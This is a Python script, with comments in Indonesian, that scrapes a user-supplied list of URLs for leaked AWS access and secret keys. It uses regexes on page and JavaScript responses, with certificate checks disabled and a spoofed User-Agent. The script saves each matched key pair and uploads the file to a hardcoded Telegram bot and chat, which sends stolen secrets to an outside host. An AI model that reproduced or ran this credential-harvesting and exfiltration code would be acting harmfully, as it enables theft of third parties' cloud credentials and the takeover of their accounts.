import multiprocessing.pool
import re
import requests
import multiprocessing

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)
def send_telegram_file(file_path):
    url = f"https://api.telegram.org/bot6258586547:AAFhXNBPJDCRQJ-1Mmj0OkSG3mHvmAbmk-0/sendDocument"
    
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': 5981225273}
        response = requests.post(url, data=data, files=files)
    
    return response
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot6258586547:AAFhXNBPJDCRQJ-1Mmj0OkSG3mHvmAbmk-0/sendMessage"
    payload = {
        'chat_id': 5981225273,
        'text': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(url, json=payload, headers=headers)
    return response

def parse_aws_credentials(url: str, response_body: str) -> None:
    matched: bool = False
    access_keys = re.findall(
        pattern=r'(?<=[\'\"])AKIA[0-9A-Z]{16}(?=[\'\"])',
        string=response_body
    )
    secret_keys = re.findall(
        pattern=r'(?<=[\'\"])[0-9a-zA-Z\/+]{40}(?=[\'\"])',
        string=response_body
    )
    for access_key in list(set(access_keys)):
        for secret_key in list(set(secret_keys)):
            if not re.search('[A-Z]', secret_key):
                continue
            if not re.search('[0-9]', secret_key):
                continue
            formatstr = f'{access_key}|{secret_key}|us-east-1'
            print(f'{url} - {formatstr}')
            with open('aws_credentials.txt', 'a') as f:
                f.write(f'{formatstr}\n')
            message = f"""
            #aws key!
            {url}
            {formatstr}
            """
            #response = send_telegram_message(message)
            response = send_telegram_file("aws_credentials.txt")
            # Cek hasil pengiriman
            if response.status_code == 200:
                print('Berhasil mengirim Result Ke telegram')
            else:
                print('Failed to send message:', response.text)
            matched = True
    if not matched:
        print(f'{url} - Check the AWS credentials manually')
        with open('check_manually.txt', 'a') as f:
            f.write(f'{url}\n')
        message = f"""
            #check manually!
            {url}
            """
        #response = send_telegram_message(message)
        response = send_telegram_file("check_manually.txt")
            # Cek hasil pengiriman
        if response.status_code == 200:
            print('Berhasil mengirim Result Ke telegram')
        else:
            print('Failed to send message:', response.text)



def request_url(url: str) -> None:
    try:
        response = requests.get(
            url=url,
            timeout=70,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        )
        if re.search('(?<=[\'\"])AKIA[0-9A-Z]{16}(?=[\'\"])', response.text):
            parse_aws_credentials(url, response.text)
        else:
            print(f'{url} - No AWS credentials found')
    except Exception as e:
        print(f'{url} - {e.__class__.__name__}')

def main() -> None:
    urls = open(input('Enter file path: '), 'r').read().splitlines()
    pool = multiprocessing.Pool(processes=10)
    pool.map(request_url, urls)
    pool.close()
    pool.join()

    # # for url in urls:
    #     request_url('https://www.poweralmanac.com/static/js/2.46f6e948.chunk.js')

if __name__ == '__main__':
    main()